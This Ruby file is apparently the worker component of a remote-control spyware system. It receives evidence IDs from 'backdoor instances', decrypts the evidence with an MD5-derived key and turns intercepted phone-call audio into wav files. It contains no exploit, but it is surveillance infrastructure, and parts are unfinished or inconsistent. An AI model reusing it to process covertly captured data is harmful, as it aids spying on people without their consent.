#
# The main file of the worker
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'
require 'rcs-common/evidence_manager'

# from RCS::Audio
require 'rcs-worker/audio_processor'
require 'rcs-worker/config'
require 'rcs-worker/evidence/call'

# form System
require 'digest/md5'
require 'em-zeromq'
require 'optparse'

module RCS
module Worker

class DummyWorker
  include Tracer
  
  SLEEP_TIME = 10
  
  def initialize(instance)
    @instance = instance
    @state = :stopped
    @evidences = []
    trace :info, "Issuing worker for backdoor instance #{instance}."
  end

  def stopped?
    @state == :stopped
  end
  
  def queue(evidence)
    
    process = Proc.new do
      @state = :running
      seconds_sleeping = 0
      trace :debug, "[#{Thread.current}][#{@instance}] starting processing."
      
      while seconds_sleeping < SLEEP_TIME
        until @evidences.empty?
          ev = @evidences.shift
          trace :debug, "[#{Thread.current}][#{@instance}] processing #{ev}."
          sleep 1
          seconds_sleeping = 0
        end
        
        sleep 1
        seconds_sleeping += 1
      end
      
      trace :debug, "[#{Thread.current}][#{@instance}] sleeping too much, stopping!"
      @state = :stopped
    end
    
    trace :info, "queueing #{evidence} for #{@instance}"
    @evidences << evidence
    
    if stopped?
      trace :debug, "deferring work for #{@instance}"
      EM.defer process
    end
    
  end
end

class EMTestPullHandler
  include Tracer
  
  attr_reader :received
  
  def initialize
    @queue = {}
  end
  
  def on_readable(socket, messages)
    # each message is "<backdoor_instance>:<evidence_id>"
    messages.each do |m|
      msg = m.copy_out_string
      instance, evidence = msg.split(":")
      @queue[instance] ||= DummyWorker.new instance
      @queue[instance].queue evidence
    end
  end
  
=begin
  def initialize
    @queue = []

    @process = Proc.new do
      result = []
      until @queue.empty?
        msg = @queue.shift
        puts "#{Thread.current} #{msg}\n"
        result << msg
      end
      result
    end
    
    @callback = Proc.new do |status|
      puts "processed #{status}\n"
    end
  end
  
  def on_readable(socket, messages)
    messages.each do |m|
      msg = m.copy_out_string
      puts "Got message #{msg}\n"
      @queue << msg
    end
    EM.defer @process, @callback
  end
  
=end
end

class Worker
  include Tracer

  attr_reader :type, :audio_processor

  def setup(port = 5150)

    # main EventMachine loop
    begin

      # all the events are handled here
      EM::run do
        # if we have epoll(), prefer it over select()
        EM.epoll
        
        # set the thread pool size
        EM.threadpool_size = 500
        
        ctx = EM::ZeroMQ::Context.new 1
        
        # setup one pull 0mq socket
        ctx.connect ZMQ::PULL, "tcp://127.0.0.1:#{port}", EMTestPullHandler.new
        trace :info, "Listening on port #{port}..."
      end
    rescue Exception => e
      # bind error
      if e.message.eql? 'no acceptor' then
        trace :fatal, "Cannot bind port #{Config.global['LISTENING_PORT']}"
        return 1
      end
      raise
    end
  
  end
    
  def process
    require 'pp'
    
    info = RCS::EvidenceManager.instance_info(@instance)
    trace :info, "Processing backdoor #{info['build']}:#{info['instance']}"
    
    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    trace :debug, "Evidence key #{info['key']}"
    evidence_key = Digest::MD5.digest info['key']
    
    evidence_sizes = RCS::EvidenceManager.evidence_info(@instance)
    evidence_ids = RCS::EvidenceManager.evidence_ids(@instance)
    trace :info, "Pieces of evidence to be processed: #{evidence_ids.join(', ')}."
    
    evidence_ids.each do |id|
      binary = RCS::EvidenceManager.get_evidence(id, @instance)
      trace :info, "Processing evidence #{id}: #{binary.size} bytes."
      
      # deserialize evidence
      begin
        evidence = RCS::Evidence.new(evidence_key).deserialize(binary)
        mod = "#{evidence.type.to_s.capitalize}Processing"
        evidence.extend eval mod if RCS.const_defined? mod.to_sym
        
        evidence.process if evidence.respond_to? :process
        
        case evidence.type
          when :CALL
            trace :debug, "Evidence channel #{evidence.channel} callee #{evidence.callee} with #{evidence.wav.size} bytes of data."
            @audio_processor.feed(evidence)
        end
      rescue EvidenceDeserializeError => e
        trace :info, "DECODING FAILED: " << e.to_s
        # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      rescue Exception => e
        trace :fatal, "FAILURE: " << e.to_s
        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      end
      
    end

    @audio_processor.to_wavfile
    
    trace :info, "All evidence has been processed."
  end
end

class Application
  include RCS::Tracer
  
  # To change this template use File | Settings | File Templates.
  def run(options) #, file)
    
    # if we can't find the trace config file, default to the system one
    if File.exist? 'trace.yaml' then
      typ = Dir.pwd
      ty = 'trace.yaml'
    else
      typ = File.dirname(File.dirname(File.dirname(__FILE__)))
      ty = typ + "/config/trace.yaml"
      #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
    end
    
    # ensure the log directory is present
    Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
    
    # initialize the tracing facility
    begin
      trace_init typ, ty
    rescue Exception => e
      puts e
      exit
    end
    
    begin
      version = File.read(Dir.pwd + '/config/version.txt')
      trace :info, "Starting a RCS Worker #{version}..."
      
      # config file parsing
      return 1 unless Config.load_from_file
      
      Worker.new.setup Config.global['LISTENING_PORT']
    rescue Exception => e
      trace :fatal, "FAILURE: " << e.to_s
      trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      return 1
    end
    
    return 0
  end
  
  # we instantiate here an object and run it
  def self.run!(*argv)
    return Application.new.run argv
  end
end

end # Worker::
end # RCS::